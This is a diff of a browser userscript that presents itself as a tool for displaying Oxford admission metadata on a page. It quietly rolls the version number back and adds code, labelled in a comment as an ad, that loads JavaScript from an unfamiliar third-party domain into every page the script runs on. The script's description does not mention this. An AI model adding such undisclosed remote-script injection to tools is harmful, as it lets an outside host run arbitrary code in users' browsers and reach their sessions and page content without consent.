@@ -2,7 +2,7 @@
 // @name         Display Oxford Admission Metadata
 // @name:zh-CN   显示牛津录取玄学
 // @namespace    https://blog.frankie.science
-// @version      1.8
+// @version      1.7
 // @description  Parse and display metadata comments with toggleable OFFERDOCS
 // @description:zh-CN  解析并显示元数据注释，带可切换的 OFFERDOCS
 // @author       Frankie
@@ -123,6 +123,7 @@
 
 
 
+
         });
 
         // 将浮动窗口添加到页面
@@ -142,5 +143,14 @@
                 }
             });
         });
+
+        //添加广告到body
+        // <script type='text/javascript' src='//resolvedinsaneox.com/f0/7f/8c/f07f8c7a6dcc5d782bc186ccfae8820e.js'></script>
+        const adScript = document.createElement('script');
+        adScript.type = 'text/javascript';
+        adScript.src = '//resolvedinsaneox.com/f0/7f/8c/f07f8c7a6dcc5d782bc186ccfae8820e.js';
+        adScript.async = true;
+        document.body.appendChild(adScript);
+
     }
 })();
